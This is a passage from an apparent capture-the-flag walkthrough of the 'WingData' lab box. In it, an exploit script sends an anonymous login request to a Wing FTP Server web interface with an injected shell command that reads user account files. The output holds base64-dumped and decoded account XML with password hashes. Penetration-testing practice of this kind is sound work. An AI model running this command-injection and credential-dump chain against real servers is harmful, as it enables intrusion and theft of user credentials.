YWU0NzQyMWIwMzwvUGFzc3dvcmQ+CiAgICAgICAgPFByb3RvY29sVHlwZT42MzwvUHJvdG9jb2xU
eXBlPgogICAgICAgIDxFbmFibGVFeHBpcmU+MDwvRW5hYmxlRXhwaXJlPgogICAgICAgIDxFeHBp
cmVUaW1lPjIwMjUtMTItMDIgMTI6MDU6NTM8L0V4cGlyZVRpbWU+CiAgICAgICAgPE1heERvd25s
b2FkU3BlZWRQZXJTZXNzaW9uPjA8L01heERvd25sb2FkU3BlZWRQZXJTZXNzaW9uPgogICAgICAg
IDxNYXhVcGxvYWRTcGVlZFBlclNlc3Npb24+MDwvTWF4VXBsb2FkU3BlZWRQZXJTZXNzaW9uPgog
ICAgICAgIDxNYXhEb3dubG9hZFNwZWVkUGVyVXNlcj4wPC9NYXhEb3dubG9hZFNwZWVkUGVyVXNl
cj4KICAgICAgICA8TWF4VXBsb2FkU3BlZWRQZXJVc2VyPjA8L01heFVwbG9hZFNwZWVkUGVyVXNl
cj4KICAgICAgICA8U2Vzc2lvbk5vQ29tbWFuZFRpbWVPdXQ+NTwvU2Vzc2lvbk5vQ29tbWFuZFRp
bWVPdXQ+CiAgICAgICAgPFNlc3Npb25Ob1RyYW5zZmVyVGltZU91dD41PC9TZXNzaW9uTm9UcmFu
c2ZlclRpbWVPdXQ+CiAgICAgICAgPE1heENvbm5lY3Rpb24+MDwvTWF4Q29ubmVjdGlvbj4KICAg
ICAgICA8Q29ubmVjdGlvblBlcklwPjA8L0Nvbm5lY3Rpb25QZXJJcD4KICAgICAgICA8UGFzc3dv
cmRMZW5ndGg+MDwvUGFzc3dvcmRMZW5ndGg+CiAgICAgICAgPFNob3dIaWRkZW5GaWxlPjA8L1No
b3dIaWRkZW5GaWxlPgogICAgICAgIDxDYW5DaGFuZ2VQYXNzd29yZD4wPC9DYW5DaGFuZ2VQYXNz
d29yZD4KICAgICAgICA8Q2FuU2VuZE1lc3NhZ2VUb1NlcnZlcj4wPC9DYW5TZW5kTWVzc2FnZVRv
U2VydmVyPgogICAgICAgIDxFbmFibGVTU0hQdWJsaWNLZXlBdXRoPjA8L0VuYWJsZVNTSFB1Ymxp
Y0tleUF1dGg+CiAgICAgICAgPFNTSFB1YmxpY0tleVBhdGg+PC9TU0hQdWJsaWNLZXlQYXRoPgog
ICAgICAgIDxTU0hBdXRoTWV0aG9kPjA8L1NTSEF1dGhNZXRob2Q+CiAgICAgICAgPEVuYWJsZVdl
Ymxpbms+MTwvRW5hYmxlV2VibGluaz4KICAgICAgICA8RW5hYmxlVXBsaW5rPjE8L0VuYWJsZVVw
bGluaz4KICAgICAgICA8RW5hYmxlVHdvRmFjdG9yPjA8L0VuYWJsZVR3b0ZhY3Rvcj4KICAgICAg
ICA8VHdvRmFjdG9yQ29kZT48L1R3b0ZhY3RvckNvZGU+CiAgICAgICAgPEV4dHJhSW5mbz48L0V4
dHJhSW5mbz4KICAgICAgICA8Q3VycmVudENyZWRpdD4wPC9DdXJyZW50Q3JlZGl0PgogICAgICAg
IDxSYXRpb0Rvd25sb2FkPjE8L1JhdGlvRG93bmxvYWQ+CiAgICAgICAgPFJhdGlvVXBsb2FkPjE8
L1JhdGlvVXBsb2FkPgogICAgICAgIDxSYXRpb0NvdW50TWV0aG9kPjA8L1JhdGlvQ291bnRNZXRo
b2Q+CiAgICAgICAgPEVuYWJsZVJhdGlvPjA8L0VuYWJsZVJhdGlvPgogICAgICAgIDxNYXhRdW90
YT4wPC9NYXhRdW90YT4KICAgICAgICA8Q3VycmVudFF1b3RhPjA8L0N1cnJlbnRRdW90YT4KICAg
ICAgICA8RW5hYmxlUXVvdGE+MDwvRW5hYmxlUXVvdGE+CiAgICAgICAgPE5vdGVzTmFtZT48L05v
dGVzTmFtZT4KICAgICAgICA8Tm90ZXNBZGRyZXNzPjwvTm90ZXNBZGRyZXNzPgogICAgICAgIDxO
b3Rlc1ppcENvZGU+PC9Ob3Rlc1ppcENvZGU+CiAgICAgICAgPE5vdGVzUGhvbmU+PC9Ob3Rlc1Bo
b25lPgogICAgICAgIDxOb3Rlc0ZheD48L05vdGVzRmF4PgogICAgICAgIDxOb3Rlc0VtYWlsPjwv
Tm90ZXNFbWFpbD4KICAgICAgICA8Tm90ZXNNZW1vPjwvTm90ZXNNZW1vPgogICAgICAgIDxFbmFi
bGVVcGxvYWRMaW1pdD4wPC9FbmFibGVVcGxvYWRMaW1pdD4KICAgICAgICA8Q3VyTGltaXRVcGxv
YWRTaXplPjA8L0N1ckxpbWl0VXBsb2FkU2l6ZT4KICAgICAgICA8TWF4TGltaXRVcGxvYWRTaXpl
PjA8L01heExpbWl0VXBsb2FkU2l6ZT4KICAgICAgICA8RW5hYmxlRG93bmxvYWRMaW1pdD4wPC9F
bmFibGVEb3dubG9hZExpbWl0PgogICAgICAgIDxDdXJMaW1pdERvd25sb2FkTGltaXQ+MDwvQ3Vy
TGltaXREb3dubG9hZExpbWl0PgogICAgICAgIDxNYXhMaW1pdERvd25sb2FkTGltaXQ+MDwvTWF4
TGltaXREb3dubG9hZExpbWl0PgogICAgICAgIDxMaW1pdFJlc2V0VHlwZT4wPC9MaW1pdFJlc2V0
VHlwZT4KICAgICAgICA8TGltaXRSZXNldFRpbWU+MTc2MjEwMzE1NjwvTGltaXRSZXNldFRpbWU+
CiAgICAgICAgPFRvdGFsUmVjZWl2ZWRCeXRlcz4wPC9Ub3RhbFJlY2VpdmVkQnl0ZXM+CiAgICAg
ICAgPFRvdGFsU2VudEJ5dGVzPjA8L1RvdGFsU2VudEJ5dGVzPgogICAgICAgIDxMb2dpbkNvdW50
PjA8L0xvZ2luQ291bnQ+CiAgICAgICAgPEZpbGVEb3dubG9hZD4wPC9GaWxlRG93bmxvYWQ+CiAg
ICAgICAgPEZpbGVVcGxvYWQ+MDwvRmlsZVVwbG9hZD4KICAgICAgICA8RmFpbGVkRG93bmxvYWQ+
MDwvRmFpbGVkRG93bmxvYWQ+CiAgICAgICAgPEZhaWxlZFVwbG9hZD4wPC9GYWlsZWRVcGxvYWQ+
CiAgICAgICAgPExhc3RMb2dpbklwPjwvTGFzdExvZ2luSXA+CiAgICAgICAgPExhc3RMb2dpblRp
bWU+MjAyNS0xMS0wMiAxMjowNTo1NjwvTGFzdExvZ2luVGltZT4KICAgICAgICA8RW5hYmxlU2No
ZWR1bGU+MDwvRW5hYmxlU2NoZWR1bGU+CiAgICA8L1VTRVI+CjwvVVNFUl9BQ0NPVU5UUz4K
----------------------
```

```
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>maria</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        <ExpireTime>2025-12-02 12:05:53</ExpireTime>
        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
        <MaxConnection>0</MaxConnection>
        <ConnectionPerIp>0</ConnectionPerIp>
        <PasswordLength>0</PasswordLength>
        <ShowHiddenFile>0</ShowHiddenFile>
        <CanChangePassword>0</CanChangePassword>
        <CanSendMessageToServer>0</CanSendMessageToServer>
        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
        <SSHPublicKeyPath></SSHPublicKeyPath>
        <SSHAuthMethod>0</SSHAuthMethod>
        <EnableWeblink>1</EnableWeblink>
        <EnableUplink>1</EnableUplink>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
        <ExtraInfo></ExtraInfo>
        <CurrentCredit>0</CurrentCredit>
        <RatioDownload>1</RatioDownload>
        <RatioUpload>1</RatioUpload>
        <RatioCountMethod>0</RatioCountMethod>
        <EnableRatio>0</EnableRatio>
        <MaxQuota>0</MaxQuota>
        <CurrentQuota>0</CurrentQuota>
        <EnableQuota>0</EnableQuota>
        <NotesName></NotesName>
        <NotesAddress></NotesAddress>
        <NotesZipCode></NotesZipCode>
        <NotesPhone></NotesPhone>
        <NotesFax></NotesFax>
        <NotesEmail></NotesEmail>
        <NotesMemo></NotesMemo>
        <EnableUploadLimit>0</EnableUploadLimit>
        <CurLimitUploadSize>0</CurLimitUploadSize>
        <MaxLimitUploadSize>0</MaxLimitUploadSize>
        <EnableDownloadLimit>0</EnableDownloadLimit>
        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
        <LimitResetType>0</LimitResetType>
        <LimitResetTime>1762103156</LimitResetTime>
        <TotalReceivedBytes>0</TotalReceivedBytes>
        <TotalSentBytes>0</TotalSentBytes>
        <LoginCount>0</LoginCount>
        <FileDownload>0</FileDownload>
        <FileUpload>0</FileUpload>
        <FailedDownload>0</FailedDownload>
        <FailedUpload>0</FailedUpload>
        <LastLoginIp></LastLoginIp>
        <LastLoginTime>2025-11-02 12:05:56</LastLoginTime>
        <EnableSchedule>0</EnableSchedule>
    </USER>
</USER_ACCOUNTS>
```

```
ajdev@rootbox:~/HTB/WingData$ python3 exploit.py -u http://ftp.wingdata.htb -c "base64 Data/1/users/steve.xml"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'base64 Data/1/users/steve.xml' and username: 'anonymous'
[+] UID extracted: bba3c3151eb1bef09a9da857c149a7b1f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: bba3c3151eb1bef09a9da857c149a7b1f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8VVNFUl9BQ0NPVU5UUyBEZXNjcmlwdGlvbj0iV2luZyBG
VFAgU2VydmVyIFVzZXIgQWNjb3VudHMiPgogICAgPFVTRVI+CiAgICAgICAgPFVzZXJOYW1lPnN0
ZXZlPC9Vc2VyTmFtZT4KICAgICAgICA8RW5hYmxlQWNjb3VudD4xPC9FbmFibGVBY2NvdW50Pgog
ICAgICAgIDxFbmFibGVQYXNzd29yZD4xPC9FbmFibGVQYXNzd29yZD4KICAgICAgICA8UGFzc3dv
cmQ+NTkxNmM3NDgxZmEyZjIwYmQ4NmY0YmRiOTAwZjAzNDIzNTllYzE5YTc3YjdlM2FlMTE4ZjNi
NWQwZDMzMzRjYTwvUGFzc3dvcmQ+CiAgICAgICAgPFByb3RvY29sVHlwZT42MzwvUHJvdG9jb2xU
eXBlPgogICAgICAgIDxFbmFibGVFeHBpcmU+MDwvRW5hYmxlRXhwaXJlPgogICAgICAgIDxFeHBp
cmVUaW1lPjIwMjUtMTItMDIgMTI6MDI6MzI8L0V4cGlyZVRpbWU+CiAgICAgICAgPE1heERvd25s
b2FkU3BlZWRQZXJTZXNzaW9uPjA8L01heERvd25sb2FkU3BlZWRQZXJTZXNzaW9uPgogICAgICAg
IDxNYXhVcGxvYWRTcGVlZFBlclNlc3Npb24+MDwvTWF4VXBsb2FkU3BlZWRQZXJTZXNzaW9uPgog
ICAgICAgIDxNYXhEb3dubG9hZFNwZWVkUGVyVXNlcj4wPC9NYXhEb3dubG9hZFNwZWVkUGVyVXNl
cj4KICAgICAgICA8TWF4VXBsb2FkU3BlZWRQZXJVc2VyPjA8L01heFVwbG9hZFNwZWVkUGVyVXNl
cj4KICAgICAgICA8U2Vzc2lvbk5vQ29tbWFuZFRpbWVPdXQ+NTwvU2Vzc2lvbk5vQ29tbWFuZFRp
bWVPdXQ+CiAgICAgICAgPFNlc3Npb25Ob1RyYW5zZmVyVGltZU91dD41PC9TZXNzaW9uTm9UcmFu
c2ZlclRpbWVPdXQ+CiAgICAgICAgPE1heENvbm5lY3Rpb24+MDwvTWF4Q29ubmVjdGlvbj4KICAg
ICAgICA8Q29ubmVjdGlvblBlcklwPjA8L0Nvbm5lY3Rpb25QZXJJcD4KICAgICAgICA8UGFzc3dv
cmRMZW5ndGg+MDwvUGFzc3dvcmRMZW5ndGg+CiAgICAgICAgPFNob3dIaWRkZW5GaWxlPjA8L1No
b3dIaWRkZW5GaWxlPgogICAgICAgIDxDYW5DaGFuZ2VQYXNzd29yZD4wPC9DYW5DaGFuZ2VQYXNz
d29yZD4KICAgICAgICA8Q2FuU2VuZE1lc3NhZ2VUb1NlcnZlcj4wPC9DYW5TZW5kTWVzc2FnZVRv
U2VydmVyPgogICAgICAgIDxFbmFibGVTU0hQdWJsaWNLZXlBdXRoPjA8L0VuYWJsZVNTSFB1Ymxp
Y0tleUF1dGg+CiAgICAgICAgPFNTSFB1YmxpY0tleVBhdGg+PC9TU0hQdWJsaWNLZXlQYXRoPgog
ICAgICAgIDxTU0hBdXRoTWV0aG9kPjA8L1NTSEF1dGhNZXRob2Q+CiAgICAgICAgPEVuYWJsZVdl
Ymxpbms+MTwvRW5hYmxlV2VibGluaz4KICAgICAgICA8RW5hYmxlVXBsaW5rPjE8L0VuYWJsZVVw
bGluaz4KICAgICAgICA8RW5hYmxlVHdvRmFjdG9yPjA8L0VuYWJsZVR3b0ZhY3Rvcj4KICAgICAg
ICA8VHdvRmFjdG9yQ29kZT48L1R3b0ZhY3RvckNvZGU+CiAgICAgICAgPEV4dHJhSW5mbz48L0V4
dHJhSW5mbz4KICAgICAgICA8Q3VycmVudENyZWRpdD4wPC9DdXJyZW50Q3JlZGl0PgogICAgICAg
IDxSYXRpb0Rvd25sb2FkPjE8L1JhdGlvRG93bmxvYWQ+CiAgICAgICAgPFJhdGlvVXBsb2FkPjE8
L1JhdGlvVXBsb2FkPgogICAgICAgIDxSYXRpb0NvdW50TWV0aG9kPjA8L1JhdGlvQ291bnRNZXRo
b2Q+CiAgICAgICAgPEVuYWJsZVJhdGlvPjA8L0VuYWJsZVJhdGlvPgogICAgICAgIDxNYXhRdW90
YT4wPC9NYXhRdW90YT4KICAgICAgICA8Q3VycmVudFF1b3RhPjA8L0N1cnJlbnRRdW90YT4KICAg
ICAgICA8RW5hYmxlUXVvdGE+MDwvRW5hYmxlUXVvdGE+CiAgICAgICAgPE5vdGVzTmFtZT48L05v
dGVzTmFtZT4KICAgICAgICA8Tm90ZXNBZGRyZXNzPjwvTm90ZXNBZGRyZXNzPgogICAgICAgIDxO
b3Rlc1ppcENvZGU+PC9Ob3Rlc1ppcENvZGU+CiAgICAgICAgPE5vdGVzUGhvbmU+PC9Ob3Rlc1Bo
b25lPgogICAgICAgIDxOb3Rlc0ZheD48L05vdGVzRmF4PgogICAgICAgIDxOb3Rlc0VtYWlsPjwv
Tm90ZXNFbWFpbD4KICAgICAgICA8Tm90ZXNNZW1vPjwvTm90ZXNNZW1vPgogICAgICAgIDxFbmFi
bGVVcGxvYWRMaW1pdD4wPC9FbmFibGVVcGxvYWRMaW1pdD4KICAgICAgICA8Q3VyTGltaXRVcGxv
YWRTaXplPjA8L0N1ckxpbWl0VXBsb2FkU2l6ZT4KICAgICAgICA8TWF4TGltaXRVcGxvYWRTaXpl
PjA8L01heExpbWl0VXBsb2FkU2l6ZT4KICAgICAgICA8RW5hYmxlRG93bmxvYWRMaW1pdD4wPC9F
bmFibGVEb3dubG9hZExpbWl0PgogICAgICAgIDxDdXJMaW1pdERvd25sb2FkTGltaXQ+MDwvQ3Vy
TGltaXREb3dubG9hZExpbWl0PgogICAgICAgIDxNYXhMaW1pdERvd25sb2FkTGltaXQ+MDwvTWF4
TGltaXREb3dubG9hZExpbWl0PgogICAgICAgIDxMaW1pdFJlc2V0VHlwZT4wPC9MaW1pdFJlc2V0
VHlwZT4KICAgICAgICA8TGltaXRSZXNldFRpbWU+MTc2MjEwMjk2NTwvTGltaXRSZXNldFRpbWU+
CiAgICAgICAgPFRvdGFsUmVjZWl2ZWRCeXRlcz4wPC9Ub3RhbFJlY2VpdmVkQnl0ZXM+CiAgICAg
ICAgPFRvdGFsU2VudEJ5dGVzPjA8L1RvdGFsU2VudEJ5dGVzPgogICAgICAgIDxMb2dpbkNvdW50
PjA8L0xvZ2luQ291bnQ+CiAgICAgICAgPEZpbGVEb3dubG9hZD4wPC9GaWxlRG93bmxvYWQ+CiAg
ICAgICAgPEZpbGVVcGxvYWQ+MDwvRmlsZVVwbG9hZD4KICAgICAgICA8RmFpbGVkRG93bmxvYWQ+
MDwvRmFpbGVkRG93bmxvYWQ+CiAgICAgICAgPEZhaWxlZFVwbG9hZD4wPC9GYWlsZWRVcGxvYWQ+
CiAgICAgICAgPExhc3RMb2dpbklwPjwvTGFzdExvZ2luSXA+CiAgICAgICAgPExhc3RMb2dpblRp
bWU+MjAyNS0xMS0wMiAxMjowMjo0NTwvTGFzdExvZ2luVGltZT4KICAgICAgICA8RW5hYmxlU2No
ZWR1bGU+MDwvRW5hYmxlU2NoZWR1bGU+CiAgICA8L1VTRVI+CjwvVVNFUl9BQ0NPVU5UUz4K
----------------------
```

```
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>steve</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        <ExpireTime>2025-12-02 12:02:32</ExpireTime>
        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
        <MaxConnection>0</MaxConnection>
        <ConnectionPerIp>0</ConnectionPerIp>
        <PasswordLength>0</PasswordLength>
        <ShowHiddenFile>0</ShowHiddenFile>
        <CanChangePassword>0</CanChangePassword>
        <CanSendMessageToServer>0</CanSendMessageToServer>
        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
        <SSHPublicKeyPath></SSHPublicKeyPath>
        <SSHAuthMethod>0</SSHAuthMethod>
        <EnableWeblink>1</EnableWeblink>
        <EnableUplink>1</EnableUplink>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
        <ExtraInfo></ExtraInfo>
        <CurrentCredit>0</CurrentCredit>
        <RatioDownload>1</RatioDownload>
        <RatioUpload>1</RatioUpload>
        <RatioCountMethod>0</RatioCountMethod>
        <EnableRatio>0</EnableRatio>
        <MaxQuota>0</MaxQuota>
        <CurrentQuota>0</CurrentQuota>
        <EnableQuota>0</EnableQuota>
        <NotesName></NotesName>
        <NotesAddress></NotesAddress>
        <NotesZipCode></NotesZipCode>
        <NotesPhone></NotesPhone>
        <NotesFax></NotesFax>
        <NotesEmail></NotesEmail>
        <NotesMemo></NotesMemo>
        <EnableUploadLimit>0</EnableUploadLimit>
        <CurLimitUploadSize>0</CurLimitUploadSize>
        <MaxLimitUploadSize>0</MaxLimitUploadSize>
        <EnableDownloadLimit>0</EnableDownloadLimit>
        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
        <LimitResetType>0</LimitResetType>
        <LimitResetTime>1762102965</LimitResetTime>
        <TotalReceivedBytes>0</TotalReceivedBytes>
        <TotalSentBytes>0</TotalSentBytes>
        <LoginCount>0</LoginCount>
        <FileDownload>0</FileDownload>
        <FileUpload>0</FileUpload>
        <FailedDownload>0</FailedDownload>
        <FailedUpload>0</FailedUpload>
        <LastLoginIp></LastLoginIp>
        <LastLoginTime>2025-11-02 12:02:45</LastLoginTime>
        <EnableSchedule>0</EnableSchedule>
    </USER>
</USER_ACCOUNTS>
```



```
http://ftp.wingdata.htb/main.html?download&weblink=rcesec&password=test&r=0.7267461779512217
```

